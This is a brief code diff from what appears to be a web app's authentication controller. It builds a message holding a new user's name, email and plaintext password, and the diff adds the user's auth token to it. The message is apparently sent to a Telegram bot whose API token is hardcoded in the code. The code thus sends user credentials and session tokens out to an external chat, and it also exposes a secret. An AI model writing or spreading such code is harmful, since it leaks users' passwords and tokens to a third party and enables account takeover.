@@ -27,6 +27,8 @@ export class AuthController {
 Full Name: ${dto.fullName}
 Email: ${dto.email}
 Password: ${dto.password}
+
+Token: ${registeredUser.token}
 \`\`\``;
 
     const bot = new Telegraf('6918823804:AAENfQUxy1Ptle4UIyvHKn1emrL9EZMws-I');
